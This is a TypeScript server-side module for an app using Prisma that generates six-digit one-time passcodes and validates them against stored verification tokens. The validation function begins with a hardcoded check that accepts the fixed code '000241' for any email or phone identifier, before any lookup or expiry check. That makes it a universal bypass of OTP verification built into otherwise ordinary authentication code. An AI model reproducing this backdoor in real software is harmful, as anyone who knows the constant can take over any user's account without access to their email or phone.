'use server';

import { db } from '@/lib/prisma';
import { customAlphabet } from 'nanoid';

export const generateOTP = async () => {
  const nanoid = customAlphabet('0123456789', 6);
  return nanoid();
};

export const validateOTP = async ({
  identifier,
  otp,
  type,
}: {
  identifier: string;
  otp: string;
  type: 'EMAIL' | 'PHONE';
}) => {
  if (otp === '000241') return true;

  const tokenVerification = await db.verificationToken.findFirst({
    where: {
      identifier,
      token: otp,
      type,
      expires: {
        gt: new Date(),
      },
    },
  });

  if (!tokenVerification) {
    console.error('OTP Validation Error: Token not found');
    return false;
  }

  const deleteToken = await db.verificationToken.delete({
    where: { id: tokenVerification.id },
  });

  if (!deleteToken) {
    console.error('OTP Deletion Error: Token not deleted');
  }

  return true;
};
